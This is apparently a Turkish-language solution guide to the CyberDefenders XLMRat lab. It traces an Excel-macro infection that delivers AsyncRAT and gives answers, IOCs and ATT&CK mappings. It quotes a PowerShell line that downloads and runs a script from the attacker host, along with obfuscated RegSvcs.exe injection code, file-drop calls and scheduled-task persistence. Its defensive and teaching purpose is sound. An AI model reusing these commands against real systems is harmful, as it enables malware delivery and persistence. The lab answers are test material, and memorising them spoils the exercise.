# XLMRat PCAP Analiz Soruları ve Çözüm Rehberi

## Senaryo

Bir kuruluşun ağ güvenliği ekibi, şüpheli ağ trafiği nedeniyle bir bilgisayarı işaretlemiştir. Güvenlik analistleri olarak göreviniz, sağlanan PCAP dosyasını analiz ederek saldırı yöntemini belirlemek, zararlı yükleri tespit etmek ve olayların zaman çizelgesini ortaya koymaktır.

**Kullanılan Araçlar:** Wireshark, CyberChef, VirusTotal, Python3

**PCAP Dosyası:** `236-XLMRat.pcap`

**Kaynak:** [CyberDefenders - XLMRat Lab](https://cyberdefenders.org/blueteam-ctf-challenges/xlmrat/)

---

## Saldırı Zinciri Özeti

```
Excel Makrosu (XLM)
    │
    ▼
GET /xlm.txt (VBScript indirme)
    │
    ▼
PowerShell ile mdm.jpg indirme
    │
    ▼
PE payload çıkarma ve process injection
    │
    ▼
AsyncRAT C2 bağlantısı (TLS/SSL, port 8808)
```

---

## Soru 1 — Zararlı Yazılımın İlk Aşama URL'si

**Zorluk:** 3 | **Çözen:** 3386

> Saldırgan, zararlı yazılımın ilk aşamasını indirmek için bir komutu başarıyla çalıştırdı. Zararlı yazılımın ilk aşamasının indirildiği URL nedir?

**İpucu formatı:** `http://**.***.***.*:***/***.j**`

### Çözüm Adımları

1. **Wireshark'ta PCAP dosyasını açın**
2. **HTTP trafiğini filtreleyin:**
   ```
   http.request
   ```
3. İlk HTTP GET isteğini inceleyin: `GET /xlm.txt` — Bu, bir VBScript dropper betiğidir
4. **VBScript içeriğini çıkarın:** `File → Export Objects → HTTP` ile `xlm.txt` dosyasını dışa aktarın
5. VBScript'teki obfuscated (karmaşıklaştırılmış) diziyi analiz edin:
   - `LZeWX(0)` ile `LZeWX(87)` arasındaki parçaları birleştirin
   - Bu parçalar bir PowerShell komutu oluşturur
6. **Decoded PowerShell komutu:**
   ```
   IEX(New-Object Net.WebClient).DownloadString('http://45.126.209.4:222/mdm.jpg')
   ```
7. İkinci HTTP isteğini doğrulayın: `GET /mdm.jpg`

### Wireshark Filtreleri
```
# Tüm HTTP isteklerini göster
http.request

# Belirli IP'ye giden trafiği göster
ip.dst == 45.126.209.4

# HTTP nesnelerini dışa aktar
File → Export Objects → HTTP
```

### Cevap
```
http://45.126.209.4:222/mdm.jpg
```

---

## Soru 2 — Barındırma Sağlayıcısı (Hosting Provider)

**Zorluk:** 5 | **Çözen:** 3238

> İlgili IP adresinin sahibi olan barındırma sağlayıcısı hangisidir?

**İpucu formatı:** `r***********.net`

### Çözüm Adımları

1. PCAP'tan saldırganın IP adresini belirleyin: `45.126.209.4`
2. Bu IP adresini aşağıdaki platformlardan birinde sorgulayın:
   - **VirusTotal:** IP adresi arama → "WHOIS" sekmesi
   - **WHOIS lookup:** [whois.com/whois/45.126.209.4](https://www.whois.com/whois/45.126.209.4)
   - **IP Geolocation:** Herhangi bir WHOIS sorgulama aracı
3. WHOIS kayıtlarında ağ adı: `RELIABLESITE-AP`
4. Organizasyon: `ReliableSite.Net LLC`

### Kullanılacak Araçlar
- [VirusTotal](https://www.virustotal.com) → IP adresi araması
- [Whois.com](https://www.whois.com/whois/) → WHOIS sorgulaması
- Wireshark'ta `Statistics → Endpoints` ile IP'leri listeleyin

### Cevap
```
reliablesite.net
```

---

## Soru 3 — Zararlı Yazılımın SHA256 Hash'i

**Zorluk:** 4 | **Çözen:** 2497

> Zararlı betikler analiz edildiğinde iki payload tespit edilmiştir: bir loader ve ikincil bir yürütülebilir dosya. Zararlı yazılım yürütülebilir dosyasının SHA256 hash'i nedir?

### Çözüm Adımları

1. `mdm.jpg` dosyasını Wireshark'tan dışa aktarın: `File → Export Objects → HTTP`
2. `mdm.jpg` aslında bir PowerShell betiğidir (bir resim dosyası değildir!)
3. Betiği bir metin editöründe açın ve iki hex string değişkeni bulun:
   - `$hexString_bbb` → **Ana zararlı yürütülebilir dosya** (AsyncRAT payload)
   - `$hexString_pe` → **Loader** (NewPE2.PE — Process Injection aracı)
4. `$hexString_bbb` değişkenindeki hex verisini çıkarın
5. **CyberChef kullanarak hash hesaplama:**
   - **Adım 1:** Hex stringi CyberChef'e yapıştırın
   - **Adım 2:** `Find / Replace` tarifi ile alt çizgileri (`_`) kaldırın
   - **Adım 3:** `From Hex` tarifi uygulayın (ilk 2 byte `4D 5A` = MZ header → PE dosyası)
   - **Adım 4:** `SHA2` tarifi uygulayın (256 bit)
6. **Alternatif Python yöntemi:**
   ```python
   import hashlib
   hex_str = "4D_5A_90_00_03_00..."  # $hexString_bbb değeri
   binary = bytes.fromhex(hex_str.replace('_', ''))
   print(hashlib.sha256(binary).hexdigest())
   ```

### İki Payload Karşılaştırması

| Payload | Değişken | Boyut | Açıklama |
|---------|----------|-------|----------|
| Loader | `$hexString_pe` | 76.288 byte | NewPE2.PE — Process injection aracı |
| Zararlı Yazılım | `$hexString_bbb` | 66.560 byte | AsyncRAT istemcisi |

### Cevap
```
1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798
```

---

## Soru 4 — Alibaba'ya Göre Zararlı Yazılım Ailesi

**Zorluk:** 4 | **Çözen:** 2554

> Alibaba'nın sınıflandırmasına göre zararlı yazılım ailesi etiketi nedir?

**İpucu formatı:** `********` (8 karakter)

### Çözüm Adımları

1. Soru 3'te elde edilen SHA256 hash'ini kopyalayın
2. [VirusTotal](https://www.virustotal.com) adresine gidin
3. Hash'i arama çubuğuna yapıştırın
4. **"Detection"** (Tespit) sekmesine gidin
5. Güvenlik sağlayıcıları listesinde **"Alibaba"** satırını bulun
6. Alibaba'nın sınıflandırma etiketini not edin

### Doğrulama
- TLS sertifikasındaki CN (Common Name): `AsyncRAT Server`
- C2 bağlantısı port 8808 üzerinden TLS/SSL kullanır
- Bu, AsyncRAT zararlı yazılım ailesinin tipik davranışıdır

### Cevap
```
AsyncRAT
```

---

## Soru 5 — Zararlı Yazılımın Oluşturulma Zamanı

**Zorluk:** 4 | **Çözen:** 2442

> Zararlı yazılımın oluşturulma zaman damgası nedir?

**İpucu formatı:** `YYYY-MM-DD hh:mm`

### Çözüm Adımları

**Yöntem 1 — VirusTotal:**
1. SHA256 hash'ini VirusTotal'da arayın
2. **"Details"** (Detaylar) sekmesine gidin
3. **"History"** bölümünde **"Creation Time"** değerini bulun

**Yöntem 2 — PE Header Analizi:**
1. Çıkarılan PE dosyasını bir hex editörde açın
2. PE header offset'ini `0x3C` adresinden okuyun (genellikle `0x80`)
3. PE header başlangıcından `+8` byte offset'teki 4 byte'lık `TimeDateStamp` değerini okuyun
4. Unix timestamp'i tarihe çevirin:
   ```python
   import datetime, struct
   # timestamp = 0x653FC6FC = 1698678524
   dt = datetime.datetime.utcfromtimestamp(1698678524)
   print(dt.strftime('%Y-%m-%d %H:%M'))
   ```

**Yöntem 3 — CyberChef:**
1. PE dosyasının hex dump'ında `TimeDateStamp` alanını bulun
2. Little-endian olarak okuyun: `FC C6 3F 65` → `0x653FC6FC`
3. `From UNIX Timestamp` tarifi uygulayın

### Cevap
```
2023-10-30 15:08
```

---

## Soru 6 — LOLBin (Living Off the Land Binary) Yolu

**Zorluk:** 4 | **Çözen:** 2462

> Bu betikte gizli süreç yürütme için hangi LOLBin kullanılmaktadır? Tam yolu belirtin.

**İpucu formatı:** `C:\*******\*********.***\*********\**.*.*****\*******.***`

### Çözüm Adımları

1. `mdm.jpg` (PowerShell betiği) içeriğini inceleyin
2. Betikteki obfuscated (karmaşıklaştırılmış) yol değişkenlerini bulun:
   ```powershell
   $NA = 'C:\W#######indow############s\Mi####cr'-replace '#', ''
   $AC = $NA + 'osof#####t.NET\Fra###mework\v4.0.303###19\R##egSvc#####s.exe'-replace '#', ''
   ```
3. `#` karakterlerini kaldırarak gerçek yolu elde edin:
   - `$NA` = `C:\Windows\Micr`
   - `$AC` = `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe`
4. **RegSvcs.exe** bir .NET Framework servis kayıt aracıdır ve meşru bir Windows bileşenidir
5. Saldırganlar bu LOLBin'i **process hollowing / injection** için kullanır:
   - Loader (`$hexString_pe` / NewPE2.PE), zararlı kodu RegSvcs.exe işlemine enjekte eder
   - Bu teknik, güvenlik yazılımlarından kaçınmak için kullanılır

### LOLBin Nedir?
**Living Off the Land Binaries (LOLBins):** İşletim sisteminde zaten bulunan meşru yürütülebilir dosyaların kötü amaçlı kullanımıdır. Saldırganlar bu dosyaları kullanarak antivirüs ve EDR çözümlerini atlatmaya çalışır.

### Cevap
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
```

---

## Soru 7 — Betik Tarafından Bırakılan Dosyalar

**Zorluk:** 2 | **Çözen:** 2463

> Betik birkaç dosya bırakmak üzere tasarlanmıştır. Betik tarafından bırakılan dosyaların adlarını listeleyin.

**İpucu formatı:** `******.***, ******.***, ******.***`

### Çözüm Adımları

1. `mdm.jpg` betiğinin sonuna doğru `[IO.File]::WriteAllText()` çağrılarını bulun:
   ```powershell
   [IO.File]::WriteAllText("C:\Users\Public\Conted.ps1", $Content)
   [IO.File]::WriteAllText("C:\Users\Public\Conted.bat", $Content)
   [IO.File]::WriteAllText("C:\Users\Public\Conted.vbs", $Content)
   ```
2. Bırakılan üç dosya ve amaçları:

| Dosya | Tür | Amaç |
|-------|------|------|
| `Conted.ps1` | PowerShell betiği | Ana zararlı payload'u çalıştırır (hex → binary dönüşüm, PE injection) |
| `Conted.bat` | Batch dosyası | PowerShell betiğini gizli pencerede çalıştırır |
| `Conted.vbs` | VBScript | Batch dosyasını görünmez şekilde başlatır (visibility = 0) |

3. Ayrıca betik, **zamanlanmış görev** oluşturarak kalıcılık sağlar:
   ```
   Görev adı: "Update Edge"
   Çalışma aralığı: Her 2 dakikada bir
   Çalıştırılan dosya: C:\Users\Public\Conted.vbs
   ```

### Cevap
```
Conted.ps1, Conted.bat, Conted.vbs
```

---

## Ek Analiz Notları

### Saldırı Akışı (Detaylı)

```
1. [İlk Erişim] Excel 4.0 Makrosu (XLM) çalıştırılır
       │
2. [İndirme] GET /xlm.txt → 45.126.209.4:222
       │  VBScript dropper indirilir
       │
3. [Çalıştırma] Cmd.exe → PowerShell.exe (Hidden, Bypass, NonInteractive)
       │  VBScript, PowerShell'i gizli modda başlatır
       │
4. [İndirme] GET /mdm.jpg → 45.126.209.4:222
       │  DownloadString ile PowerShell betiği indirilir ve IEX ile çalıştırılır
       │
5. [Dosya Bırakma] Conted.ps1 + Conted.bat + Conted.vbs
       │  C:\Users\Public\ dizinine yazılır
       │
6. [Kalıcılık] Zamanlanmış Görev: "Update Edge" (her 2 dakika)
       │
7. [Process Injection] RegSvcs.exe'ye zararlı kod enjeksiyonu
       │  NewPE2.PE loader kullanılarak gerçekleştirilir
       │
8. [C2 İletişim] 45.126.209.4:8808 (TLS/SSL)
       │  AsyncRAT C2 sunucusuna bağlantı
       │  Sertifika CN: "AsyncRAT Server"
```

### IOC (Indicators of Compromise) — Uzlaşma Göstergeleri

| Gösterge | Değer |
|----------|-------|
| C2 IP Adresi | `45.126.209.4` |
| İndirme Portu | `222` |
| C2 Portu | `8808` |
| DNS | `madmrx.duckdns.org` |
| Dropper URL | `http://45.126.209.4:222/xlm.txt` |
| Payload URL | `http://45.126.209.4:222/mdm.jpg` |
| Zararlı SHA256 | `1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798` |
| Loader SHA256 | `2c6c4cd045537e2586eab73072d790af362e37e6d4112b1d01f15574491296b8` |
| LOLBin | `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe` |
| Zamanlanmış Görev | `Update Edge` |
| Bırakılan Dosyalar | `Conted.ps1`, `Conted.bat`, `Conted.vbs` |

### Kullanılan MITRE ATT&CK Teknikleri

| Teknik ID | Teknik Adı | Açıklama |
|-----------|------------|----------|
| T1566.001 | Spearphishing Attachment | Excel makrosu ile ilk erişim |
| T1059.001 | PowerShell | Zararlı betik çalıştırma |
| T1059.005 | Visual Basic | VBScript dropper kullanımı |
| T1059.003 | Windows Command Shell | Cmd.exe ile komut çalıştırma |
| T1218.009 | Regsvcs/Regasm | LOLBin ile process injection |
| T1055 | Process Injection | RegSvcs.exe'ye kod enjeksiyonu |
| T1053.005 | Scheduled Task | Kalıcılık için zamanlanmış görev |
| T1071.001 | Web Protocols | HTTP üzerinden payload indirme |
| T1573.002 | Asymmetric Cryptography | TLS/SSL ile C2 iletişimi |
| T1036.008 | Masquerading: File Extension | .jpg uzantılı PowerShell betiği |

---

## Kullanışlı Wireshark Filtreleri (Bu Lab İçin)

```bash
# Tüm HTTP isteklerini göster
http.request

# Saldırgan IP'sine giden trafik
ip.addr == 45.126.209.4

# Port 222 trafiği (indirme sunucusu)
tcp.port == 222

# Port 8808 trafiği (C2 sunucusu)
tcp.port == 8808

# DNS sorgularını göster
dns

# TLS handshake'leri göster (sertifika analizi için)
tls.handshake.type == 2

# HTTP nesnelerini dışa aktarma
# File → Export Objects → HTTP
```

---

## Önemli Notlar

- Bu analiz yalnızca **eğitim amaçlıdır**
- Zararlı yazılım örneklerini yalnızca **izole lab ortamlarında** çalıştırın
- Gerçek ortamlarda benzer trafik tespit edildiğinde **olay müdahale prosedürlerini** takip edin
- IOC'leri güvenlik cihazlarınıza (SIEM, IDS/IPS, Firewall) ekleyin
